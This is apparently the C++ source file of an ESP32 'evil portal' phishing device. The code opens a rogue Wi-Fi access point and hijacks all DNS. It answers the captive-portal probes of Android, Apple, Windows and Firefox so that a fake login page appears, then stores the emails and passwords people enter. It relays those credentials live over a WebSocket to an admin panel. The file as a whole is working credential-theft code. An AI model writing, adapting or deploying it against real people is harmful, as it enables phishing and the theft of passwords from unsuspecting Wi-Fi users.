#include "portal.h"

AsyncWebServer server(http_port);
WebSocketsServer webSocket = WebSocketsServer(ws_port);
DNSServer dnsServer;

Console console;

LinkedList<User> credsList = LinkedList<User>();

bool portalOpen = false;

void setupWifi(const char *ssid, const IPAddress &localIP, const IPAddress &gatewayIP) {
  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAPConfig(localIP, gatewayIP, subnetMask);
  WiFi.softAP(ssid, NULL, wifi_channel, 0, max_clients);
  IPAddress myIP = WiFi.softAPIP();
  Serial.print("AP IP address: ");
  Serial.println(myIP);

  console.log("AP IP: " + myIP.toString(), Console::LogType::INFO);
}

void setupDNSServer(DNSServer &dnsServer, const IPAddress &localIP) {
  dnsServer.setTTL(3600);
  dnsServer.start(53, "*", localIP); // Respond to all domains with the ESP32's IP
}

void setupWebServer(AsyncWebServer &server, const IPAddress &localIP) {
	// Required
	server.on("/connecttest.txt", [](AsyncWebServerRequest *request) { request->redirect("http://logout.net"); });	// windows 11 captive portal workaround
	server.on("/wpad.dat", [](AsyncWebServerRequest *request) { request->send(404); });								// Honestly don't understand what this is but a 404 stops win 10 keep calling this repeatedly and panicking the esp32 :)

  // Backup Responses
	server.on("/generate_204", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });		   // android captive portal redirect
	server.on("/redirect", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });			   // microsoft redirect
	server.on("/hotspot-detect.html", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });  // apple call home
	server.on("/canonical.html", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });	   // firefox captive portal call home
	server.on("/success.txt", [](AsyncWebServerRequest *request) { request->send(200); });					   // firefox captive portal call home
	server.on("/ncsi.txt", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });			   // windows call home

	// Return 404 to webpage icon
	server.on("/favicon.ico", [](AsyncWebServerRequest *request) { request->send(404); });	// webpage icon

	// Serve Basic HTML Page
	server.on("/", HTTP_ANY, [](AsyncWebServerRequest *request) {
		AsyncWebServerResponse *response = request->beginResponse(200, "text/html", LOGIN_PAGE);
		request->send(response);
	});

	// The Catch All
	server.onNotFound([](AsyncWebServerRequest *request) {
		request->redirect(localIPURL);
	});

  server.on("/post", HTTP_POST, [](AsyncWebServerRequest *request) {
    String email = request->getParam("email", true)->value().c_str();
    String password = request->getParam("password", true)->value().c_str();

    // IF ADMIN CREDS MATCH WITH THE INPUTTED CREDS
    if (email == auser && password == apass) {
      request->send(200, "text/html", ADMIN_PAGE);
    } else { // ELSE LOG THE CREDS TO THE LIST AND SEND THEM TO THE ADMIN PANEL VIA WEBSOCKET BROADCAST
      request->send(200, "text/html", "<h1>Login successful!</h1>");

      User userData;
      JsonDocument jsonDoc;
      
      // FOR SOME REASON ONLY WORKS IF YOU GET THE PARAMETERS AT THE TIME OF (OR VERY SHORTLY BEFORE) USING THEM | I LOVE C!!!!
      // UPDATE TIME! LETS MAKE THIS INTO JSON! CUS YEAH FIXES BUGS AND STUFF AND CONCURRENCY!

      userData.email = request->getParam("email", true)->value().c_str();
      userData.pass = request->getParam("password", true)->value().c_str();

      console.log("Logged User - " + (String)userData.email + ":" + (String)userData.pass, Console::LogType::ALERT);

      credsList.add(userData);

      if (webSocket.connectedClients() > 0) {
        jsonDoc["email"] = request->getParam("email", true)->value().c_str();
        jsonDoc["password"] = request->getParam("password", true)->value().c_str();

        char data[200];
        serializeJson(jsonDoc, data); 

        Serial.printf("Sending Message Buffer: %s\n", data);
        webSocket.broadcastTXT(data);
      }
    }
  });
}

// Callback: receiving any WebSocket message
void onWebSocketEvent(uint8_t client_number,
                      WStype_t type,
                      uint8_t * payload,
                      size_t length) {

  // Figure out the type of WebSocket event
  switch(type) {

    // Client has disconnected
    case WStype_DISCONNECTED:
      Serial.printf("[%u] Disconnected!\n", client_number);
      console.log("[" + ((String) client_number) + "]" + " Disconnected", Console::LogType::ERROR);
      break;

    // New client has connected
    case WStype_CONNECTED:
      {
        IPAddress ip = webSocket.remoteIP(client_number);
        Serial.printf("[%u] Connection from ", client_number);
        Serial.println(ip.toString());
        console.log("[" + ((String) client_number) + "]" + " Connected from " + ip.toString(), Console::LogType::ALERT);
      }
      break;

    // Handle text messages from client
    case WStype_TEXT:
    {
      JsonDocument jsonDoc;
      DeserializationError error = deserializeJson(jsonDoc, payload);

      if (error) {
        Serial.print("deserializeJson() returned ");
        Serial.println(error.c_str());
        console.log("Bad JSON", Console::LogType::ERROR);
        return;
      }

      const char* action = jsonDoc["action"]; //Get the action value (eg. changeSSID, shutdown, etc)

      // Print out raw message
      Serial.printf("[%u] Received text: %s\n", client_number, action);
      console.log("[" + ((String) client_number) + "]" + " sent a message", Console::LogType::ALERT);

      // Shutdown portal and device
      if ( strcmp((char *)action, "shutdown") == 0 ) {
        closePortal();
        delay(1000);
        StickCP2.Power.powerOff();

      // Change SSID
      } else if ( strcmp((char *)action, "changeSSID") == 0 ) {
        // const char* newSSID = jsonDoc["value"];
        String newSSID = jsonDoc["value"];

        Serial.printf("[%u] New SSID: %s\n", client_number, newSSID);
        console.log("[" + ((String) client_number) + "]" + " - NEW SSID: " + newSSID, Console::LogType::ALERT);

        closePortal();
        delay(5000);
        openPortalSSID(newSSID);

      // Message not recognized
      } else if ( strcmp((char *)action, "populateTable") == 0 ) {
        // ITERATE THROUGH THE LINKED LIST AND SEND THEM OFF TO ADMIN PANEL CLIENT
        for (int i = 0; i < credsList.size(); i++) {
          // Get value from list
          User userData = credsList.get(i);
          Serial.printf("%s : %s\n", userData.email, userData.pass);

          JsonDocument jsonDoc;
      
          jsonDoc["email"] = userData.email;
          jsonDoc["password"] = userData.pass;

          char data[200];
          serializeJson(jsonDoc, data); 

          webSocket.sendTXT(client_number, data);
        }
      } else if ( strcmp((char *)action, "batteryCheck") == 0 ) {
        float mult = StickCP2.Power.getBatteryVoltage() / MAX_VOLTAGE;

        int battery_level = (int) round(mult * 100);

        JsonDocument jsonDoc;
    
        jsonDoc["battery"] = battery_level;

        char data[200];
        serializeJson(jsonDoc, data); 

        webSocket.sendTXT(client_number, data);
      } else { // Message not recognized
        Serial.printf("[%u] Message not recognized\n", client_number);
        console.log("[" + ((String) client_number) + "]" + " - Message not recognized", Console::LogType::ERROR);
      }
    }
    break;

    // For everything else: do nothing
    case WStype_BIN:
    case WStype_ERROR:
    case WStype_FRAGMENT_TEXT_START:
    case WStype_FRAGMENT_BIN_START:
    case WStype_FRAGMENT:
    case WStype_FRAGMENT_FIN:
    default:
      break;
  }
}

// void setSSID(const char *ssid) {
void setSSID(String ssid) {
  defaultSSID = ssid;
} 

// void openPortalSSID(const char *ssid) {
void openPortalSSID(String ssid) {
  setupWifi(ssid.c_str(), localIP, localIP);

  setupDNSServer(dnsServer, localIP);

  setupWebServer(server, localIP);
  server.begin();

  webSocket.begin();
  webSocket.onEvent(onWebSocketEvent);

  setSSID(ssid);

  portalOpen = true;

  Serial.println("Server started");
  console.log("Server started", Console::LogType::INFO);
}

void openPortal() {
  openPortalSSID(defaultSSID);
}

void closePortal() {
  webSocket.close();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);

  portalOpen = false;

  Serial.println("Server closed");
  console.log("Server closed", Console::LogType::INFO);
}

void portalLoop() {
  dnsServer.processNextRequest(); // Handle DNS requests
  webSocket.loop();
  delay(30);
}

bool isPortalOpen() {
  return portalOpen;
}

String getSSID() {
  return defaultSSID;
}